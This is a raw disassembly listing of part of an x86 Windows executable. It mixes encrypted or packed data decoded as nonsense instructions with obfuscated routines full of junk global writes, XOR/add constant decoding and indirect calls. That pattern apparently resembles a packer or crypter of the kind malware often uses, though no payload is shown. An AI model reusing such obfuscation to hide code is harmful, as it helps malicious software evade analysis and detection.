  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	add    ah,dl
  406313:	xor    eax,0x7e3f545a
  406318:	jle    0x406346
  40631a:	jge    0x40639a
  40631c:	jle    0x40632b
  40631e:	icebp  
  40631f:	push   ecx
  406320:	and    bl,al
  406322:	pop    ebp
  406323:	pop    ds
  406324:	lahf   
  406325:	ins    BYTE PTR es:[edi],dx
  406326:	push   ebp
  406327:	fcmovbe st,st(6)
  406329:	mov    ah,0xf6
  40632b:	out    0xd9,eax
  40632d:	adc    al,BYTE PTR [ebp+0x15]
  406330:	pop    esp
  406331:	pop    ecx
  406332:	fild   QWORD PTR ds:0x1109427f
  406338:	gs sti 
  40633a:	mov    esi,0xcef212f
  40633f:	inc    ecx
  406340:	pop    edi
  406341:	xor    esi,edi
  406343:	addr16 ret 0xa920
  406347:	popa   
  406348:	inc    edi
  406349:	cwde   
  40634a:	xlat   BYTE PTR ds:[ebx]
  40634b:	fdiv   QWORD PTR [ebx]
  40634d:	cwde   
  40634e:	imul   eax,DWORD PTR [edx],0x4
  406351:	addr16 ja 0x4063b0
  406354:	cmp    eax,0x8b961f77
  406359:	xchg   esp,eax
  40635a:	adc    eax,edi
  40635c:	jb     0x4062fe
  40635e:	dec    ebx
  40635f:	rcl    BYTE PTR [eax],0xbf
  406362:	jge    0x406371
  406364:	outs   dx,DWORD PTR ds:[esi]
  406365:	cmp    ebx,DWORD PTR [edi-0x385e3ff1]
  40636b:	cmp    DWORD PTR [eax+edi*8-0x103a0aee],edx
  406372:	pop    ds
  406373:	repnz sbb eax,0x2e32912e
  406379:	leave  
  40637a:	arpl   cx,di
  40637c:	xor    DWORD PTR [edi],esi
  40637e:	pop    es
  40637f:	(bad)  
  406381:	xlat   BYTE PTR ds:[ebx]
  406382:	and    al,0xa7
  406384:	push   ebp
  406385:	lods   al,BYTE PTR ds:[esi]
  406386:	mov    ds:0xf7dc2ecd,al
  40638b:	test   eax,0xf04f5ef9
  406390:	sbb    al,0x13
  406392:	push   0xffffffae
  406394:	inc    DWORD PTR [edi+0x60]
  406397:	fadd   DWORD PTR [ebx]
  406399:	ja     0x40634b
  40639b:	push   eax
  40639c:	add    al,0x6f
  40639e:	in     eax,dx
  40639f:	popa   
  4063a0:	xchg   ebp,eax
  4063a1:	retf   0x29d7
  4063a4:	adc    al,0x7e
  4063a6:	jb     0x40639b
  4063a8:	call   0xef05317c
  4063ad:	scas   al,BYTE PTR es:[edi]
  4063ae:	test   al,0x1e
  4063b0:	cs es int3 
  4063b3:	dec    edi
  4063b4:	add    BYTE PTR ds:0x72c1b076,ch
  4063ba:	push   ss
  4063bb:	inc    edx
  4063bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063bd:	sahf   
  4063be:	cmc    
  4063bf:	in     al,dx
  4063c0:	mov    dh,0xc8
  4063c2:	add    DWORD PTR [edi],0xffffffcf
  4063c5:	add    cl,BYTE PTR [ebp+0x5e165dcc]
  4063cb:	fwait
  4063cc:	nop
  4063cd:	cli    
  4063ce:	push   0x439039ae
  4063d3:	add    bl,cl
  4063d5:	xchg   edi,eax
  4063d6:	jl     0x406439
  4063d8:	cmp    eax,0xb4635e04
  4063dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063de:	mov    ds,ax
  4063e1:	in     eax,0xfa
  4063e3:	lds    esp,FWORD PTR [eax+0x6e]
  4063e6:	mov    ebx,0xc717e7e0
  4063eb:	popa   
  4063ec:	hlt    
  4063ed:	repz lds ebx,FWORD PTR [edx+ebp*1-0x48]
  4063f2:	stc    
  4063f3:	dec    esp
  4063f4:	popf   
  4063f5:	ss push ecx
  4063f7:	mov    ecx,0x55ea03d4
  4063fc:	stos   BYTE PTR es:[edi],al
  4063fd:	pmullw mm7,QWORD PTR [ebp-0x15]
  406401:	scas   eax,DWORD PTR es:[edi]
  406402:	imul   ecx,DWORD PTR [edi-0x25],0x1a
  406406:	dec    edi
  406407:	stos   DWORD PTR es:[edi],eax
  406408:	popa   
  406409:	sub    DWORD PTR [ecx-0x51],ebx
  40640c:	or     bl,BYTE PTR [esi-0x63]
  40640f:	inc    ebx
  406410:	sbb    ecx,edx
  406412:	jecxz  0x40644d
  406414:	pop    ebx
  406415:	std    
  406416:	(bad)  
  406417:	mov    eax,ds:0x2f635f9b
  40641c:	cli    
  40641d:	mov    ch,0xb5
  40641f:	push   ecx
  406420:	add    dl,BYTE PTR [edx-0x5302c6cc]
  406426:	adc    bl,bl
  406428:	nop
  406429:	iret   
  40642a:	mov    ds:0x3041c023,al
  40642f:	push   di
  406431:	push   es
  406432:	xor    eax,0xc28f3835
  406437:	ja     0x40646f
  406439:	imul   eax,DWORD PTR [ebp+0x52a929c7],0xffffffd8
  406440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406441:	in     al,0x29
  406443:	idiv   esi
  406445:	mov    ebp,0xc375437
  40644a:	data16 fidivr WORD PTR [ecx+edi*1+0x26]
  40644f:	lods   eax,DWORD PTR es:[esi]
  406451:	mov    ecx,0x9e295523
  406456:	add    DWORD PTR [ebp-0x43],eax
  406459:	push   es
  40645a:	dec    esi
  40645b:	shl    BYTE PTR [ebx],1
  40645d:	mov    dh,0x6
  40645f:	add    eax,0x488a17a4
  406464:	push   esi
  406465:	stos   DWORD PTR es:[edi],eax
  406466:	mov    ch,dh
  406468:	jp     0x406476
  40646a:	ins    BYTE PTR es:[edi],dx
  40646b:	ret    
  40646c:	ins    BYTE PTR es:[edi],dx
  40646d:	xor    ebp,DWORD PTR [edx+0x212e0fc5]
  406473:	sbb    eax,0xc3c5cb17
  406478:	xor    ch,BYTE PTR [ebx-0x42]
  40647b:	outs   dx,BYTE PTR ds:[esi]
  40647c:	ret    
  40647d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40647e:	xchg   edx,eax
  40647f:	stc    
  406480:	sbb    eax,0x28bec8a5
  406485:	test   DWORD PTR [ecx+0x2],0xae24142e
  40648c:	mov    eax,0x75f694c0
  406491:	bts    DWORD PTR [ecx-0x70],ebx
  406495:	cmp    al,0xd7
  406497:	mov    BYTE PTR ds:0xe580e5e9,dl
  40649d:	jmp    0x4c4fae0b
  4064a2:	cmp    cl,BYTE PTR [esi+esi*1]
  4064a5:	shr    esp,cl
  4064a7:	push   ebx
  4064a8:	or     ah,BYTE PTR [edx+0x25e7a333]
  4064ae:	mov    al,ds:0x1ed8fb5f
  4064b3:	cmp    al,0x4b
  4064b5:	pop    eax
  4064b6:	or     BYTE PTR [ebx+0x50afa693],cl
  4064bc:	das    
  4064bd:	subps  xmm4,XMMWORD PTR [ebx-0x3c]
  4064c1:	sbb    al,0x7
  4064c3:	ins    DWORD PTR es:[edi],dx
  4064c4:	push   edx
  4064c5:	loope  0x4064cf
  4064c7:	das    
  4064c8:	popf   
  4064c9:	push   ecx
  4064ca:	es into 
  4064cc:	xchg   esp,eax
  4064cd:	in     al,dx
  4064ce:	sub    ecx,DWORD PTR [ebp-0xbcdb34c]
  4064d4:	ss loopne 0x4064ae
  4064d7:	out    0x22,al
  4064d9:	scas   al,BYTE PTR es:[edi]
  4064da:	sbb    BYTE PTR [edx+0x267a7a1f],al
  4064e0:	jle    0x4064ae
  4064e2:	cmp    BYTE PTR [ebx+0x2b953a4],dh
  4064e8:	stc    
  4064e9:	or     BYTE PTR [ebx],0xd8
  4064ec:	xchg   ebx,eax
  4064ed:	out    dx,eax
  4064ee:	mov    ds:0xe05b7d09,eax
  4064f3:	inc    edi
  4064f4:	sbb    dl,BYTE PTR [edi+0x39]
  4064f7:	mov    esp,0xe57ebcfc
  4064fc:	shr    BYTE PTR [ebp+0x217ce2fa],cl
  406502:	mov    ah,0xa2
  406504:	mov    bl,0x72
  406506:	cmp    esp,esi
  406508:	retf   
  406509:	cdq    
  40650a:	cmp    BYTE PTR [edi],dl
  40650c:	mov    esp,es
  40650e:	fmulp  st(5),st
  406510:	dec    edi
  406511:	mov    BYTE PTR [esi+0x7825644a],dl
  406517:	inc    ecx
  406518:	jmp    0x207:0x21fcd9f1
  40651f:	inc    eax
  406520:	sub    al,0x68
  406522:	idiv   BYTE PTR [ebp+0x7f]
  406525:	adc    al,0x92
  406527:	adc    BYTE PTR ds:0x11a8ea64,dh
  40652d:	push   edi
  40652e:	stc    
  40652f:	jmp    FWORD PTR [ebp+0x58]
  406532:	fbld   TBYTE PTR [ebx-0x40ee4610]
  406538:	adc    eax,0xf48a6fdc
  40653d:	loope  0x4065b4
  40653f:	jne    0x406518
  406541:	in     eax,dx
  406542:	aaa    
  406543:	rol    DWORD PTR [esi-0x3c],0x6b
  406547:	in     eax,dx
  406548:	adc    eax,0xcdde1a48
  40654d:	fs sbb cl,al
  406550:	mov    edi,0x69bd542b
  406555:	push   edi
  406556:	or     eax,DWORD PTR [esi]
  406558:	mov    cl,0x99
  40655a:	rep lods al,BYTE PTR ds:[esi]
  40655c:	into   
  40655d:	jae    0x4064f3
  40655f:	cld    
  406560:	add    al,0xcb
  406562:	and    BYTE PTR [edx+eax*1+0x29],dh
  406566:	pop    edx
  406567:	sub    eax,0x854eb1dd
  40656c:	mov    al,0x3f
  40656e:	xchg   ecx,eax
  40656f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406570:	sub    al,0xae
  406572:	add    DWORD PTR [edx+0x6a8b8b2],eax
  406578:	and    al,0x7
  40657a:	and    DWORD PTR [ebx+0x5178f7c9],esi
  406580:	push   ss
  406581:	jno    0x4065b7
  406583:	sub    esp,ecx
  406585:	inc    ebx
  406586:	stos   BYTE PTR es:[edi],al
  406587:	mov    ebp,0x84890248
  40658c:	les    ebp,FWORD PTR [edi+eiz*2]
  40658f:	(bad)  
  406590:	sub    eax,0x8e7c8405
  406595:	and    esi,0xffffffd9
  406598:	retf   
  406599:	mov    esi,0xadaef853
  40659e:	mov    esi,0x828d022a
  4065a3:	jno    0x4065cd
  4065a5:	rcr    DWORD PTR [ebx+0x4116b0a7],cl
  4065ab:	pop    ebx
  4065ac:	add    bh,BYTE PTR [edi]
  4065ae:	xor    al,BYTE PTR [ebp+0x76]
  4065b1:	ins    BYTE PTR es:[edi],dx
  4065b2:	adc    al,0x90
  4065b4:	test   BYTE PTR [ebx],dl
  4065b6:	test   DWORD PTR [ecx+0x55],ebp
  4065b9:	pop    ebx
  4065ba:	push   ss
  4065bb:	cli    
  4065bc:	les    ebx,FWORD PTR [esi-0x67]
  4065bf:	jmp    0xd730:0xca02bb8c
  4065c6:	push   esp
  4065c7:	cmp    al,BYTE PTR [eax]
  4065c9:	jne    0x40656c
  4065cb:	adc    eax,0xa22ab0a5
  4065d0:	popa   
  4065d1:	push   ss
  4065d2:	add    esi,DWORD PTR [edx]
  4065d4:	call   0xde8cf352
  4065d9:	into   
  4065da:	or     BYTE PTR [edx+0x373b1582],bl
  4065e0:	push   ss
  4065e1:	xchg   DWORD PTR [ebx],esp
  4065e3:	(bad)  
  4065e4:	popf   
  4065e5:	shl    DWORD PTR [ebx],cl
  4065e7:	ins    DWORD PTR es:[edi],dx
  4065e8:	pop    ds
  4065e9:	push   edi
  4065ea:	or     DWORD PTR [esi+0x2f],esp
  4065ed:	in     eax,0x40
  4065ef:	std    
  4065f0:	sbb    al,0x3c
  4065f2:	pop    es
  4065f3:	pop    eax
  4065f4:	fbld   TBYTE PTR [ebx]
  4065f6:	bound  ebx,QWORD PTR [esi+esi*8-0x796fb7e7]
  4065fd:	popa   
  4065fe:	test   BYTE PTR [ebp+0x44],bl
  406601:	sbb    BYTE PTR [ebx+0x1e],cl
  406604:	popf   
  406605:	xor    al,0x66
  406607:	je     0x4065cc
  406609:	sbb    bl,BYTE PTR [edx]
  40660b:	xchg   BYTE PTR [bp+si],bl
  40660e:	jno    0x4065f5
  406610:	xchg   ecx,eax
  406611:	les    ebp,FWORD PTR [edx+0x5a]
  406614:	add    DWORD PTR [edx-0x21],0x62
  406618:	sbb    eax,0x5a504419
  40661d:	pop    ds
  40661e:	push   0x45
  406620:	push   ss
  406621:	es popa 
  406623:	outs   dx,BYTE PTR ds:[esi]
  406624:	outs   dx,DWORD PTR ds:[esi]
  406625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406626:	jecxz  0x40665b
  406628:	adc    BYTE PTR [ecx-0x66cd5404],dh
  40662e:	add    ebp,DWORD PTR [ebx]
  406630:	xchg   BYTE PTR [eax+0x5ff9740d],ch
  406636:	lods   al,BYTE PTR ds:[esi]
  406637:	fmul   DWORD PTR [edx]
  406639:	cli    
  40663a:	jg     0x406661
  40663c:	add    BYTE PTR [edx-0x48],cl
  40663f:	rcr    BYTE PTR [edx+0x24],1
  406642:	pop    ds
  406643:	clc    
  406644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406645:	push   ebp
  406646:	add    DWORD PTR [ebx+eiz*8+0x7a9217f8],ebp
  40664d:	cmp    eax,0xe9d0ff77
  406652:	add    eax,DWORD PTR [eax]
  406654:	add    BYTE PTR [eax],al
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x43367b,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x433753,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x433727,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x433763,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x433763
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x433763,ecx
  4066d8:	cmp    DWORD PTR ds:0x433763,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433883
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x433763,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x433763
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x433763,ecx
  406714:	cmp    DWORD PTR ds:0x433763,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x433757
  406728:	and    ecx,DWORD PTR ds:0x43368f
  40672e:	mov    DWORD PTR ds:0x433757,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43369b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x4337ab
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433693,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x4336eb,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433687,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433687
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433687,ebx
  40677d:	cmp    DWORD PTR ds:0x433687,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433687,0x23
  406791:	jne    0x4067a7
  406797:	push   0x4338b3
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x43372b,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433717,0x433727
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x433753
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x4336eb,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433693,0x43371f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433687,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x43372f
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x433763
  40683c:	and    DWORD PTR ds:0x433727,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x4337ab
  40684d:	or     DWORD PTR ds:0x433763,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x4336db,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43379f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x43372b
  406870:	sub    DWORD PTR ds:0x433753,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43368b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433687,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433693,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43368f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x4336a3,0x4337ab
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43371b,0x43375f
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x433767,0x433713
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x4336d3,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x4336db,0x43376f
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x43372b,0x4336ef
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x4336db,0x43371b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x43367b
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x43367b,0x4336a3
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x43375b
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x43367f,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x43376f,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43379b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43379b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43379b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43379b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43379b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433717
  4069db:	adc    ecx,DWORD PTR ds:0x4336df
  4069e1:	mov    DWORD PTR ds:0x433717,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433713,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x4336e7,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433713,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43368f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43371b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43369b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x433753,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0xb7bdaa5f
  406b85:	mov    BYTE PTR [edx],0x3b
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0x8b7e7e7f
  406b8f:	imul   edi,DWORD PTR [ecx+eiz*4],0xffffff89
  406b93:	stc    
  406b94:	mov    cl,0xc8
  406b96:	fld    QWORD PTR [edx+eax*8+0x7b]
  406b9a:	(bad)  
  406b9b:	mov    BYTE PTR [ebx],cl
  406b9d:	add    bh,BYTE PTR [esi]
  406b9f:	sti    
  406ba0:	inc    esp
  406ba1:	aas    
  406ba2:	add    al,0x68
  406ba4:	jecxz  0x406c07
  406ba6:	mov    WORD PTR [ebp-0x12],fs
  406ba9:	into   
  406baa:	adc    esi,edi
  406bac:	cld    
  406bad:	push   ebx
  406bae:	ret    
  406baf:	aaa    
  406bb0:	push   ds
  406bb1:	leave  
  406bb2:	sub    DWORD PTR [ecx+0x136626eb],0x41ad5ae4
  406bbc:	retf   0x8a58
  406bbf:	(bad)  
  406bc0:	jg     0x406beb
  406bc2:	jno    0x406b6c
  406bc4:	mov    ebx,0x6089c9c7
  406bc9:	mov    ?,eax
  406bcb:	stos   DWORD PTR es:[edi],eax
  406bcc:	sub    edi,0x8
  406bcf:	scas   al,BYTE PTR es:[edi]
  406bd0:	cs inc edi
  406bd2:	push   ebx
  406bd3:	pop    eax
  406bd4:	gs inc ebx
  406bd6:	shl    BYTE PTR [ebp+0x25],1
  406bd9:	push   ss
  406bda:	imul   esp,DWORD PTR [esi-0x6],0xfffffffa
  406bde:	jmp    FWORD PTR [ebp+ebx*1-0x26]
  406be2:	dec    eax
  406be3:	fs pop esi
  406be5:	clc    
  406be6:	pop    es
  406be7:	jbe    0x406c0f
  406be9:	jecxz  0x406bd6
  406beb:	mov    bl,0x11
  406bed:	outs   dx,BYTE PTR ds:[esi]
  406bee:	lock push 0xdcdcf263
  406bf4:	leave  
  406bf5:	cmp    DWORD PTR [ebx+0xb312bec],0x99dda4b6
  406bff:	push   0x2003984f
  406c04:	pop    esp
  406c05:	mov    cl,BYTE PTR ds:0xf3f5ae60
  406c0b:	inc    eax
  406c0c:	test   al,0x96
  406c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c0f:	outs   dx,DWORD PTR ds:[esi]
  406c10:	mov    eax,0xc428fcd1
  406c15:	xor    DWORD PTR [esi-0x2a],0x7a8a6515
  406c1c:	lods   eax,DWORD PTR ds:[esi]
  406c1d:	int3   
  406c1e:	inc    esp
  406c1f:	loop   0x406c32
  406c21:	jl     0x406bb5
  406c23:	(bad)  
  406c24:	in     al,0x50
  406c26:	push   ds
  406c27:	pop    esp
  406c28:	dec    edx
  406c29:	push   0x33
  406c2b:	adc    DWORD PTR [esi+0x4e902c58],edx
  406c31:	cli    
  406c32:	test   al,0xa6
  406c34:	loop   0x406c3a
  406c36:	arpl   bp,dx
  406c38:	idiv   BYTE PTR [edi]
  406c3a:	mov    dh,0x2f
  406c3c:	mov    edi,0x40dea73
  406c41:	sbb    edx,esi
  406c43:	pop    edi
  406c44:	add    BYTE PTR [eax-0x5b],ch
  406c47:	mul    DWORD PTR [edi+0x39]
  406c4a:	mov    dl,0x15
  406c4c:	mov    ch,0x7f
  406c4e:	rol    dh,0x4c
  406c51:	mov    DWORD PTR [esi+ebp*1-0x7],eax
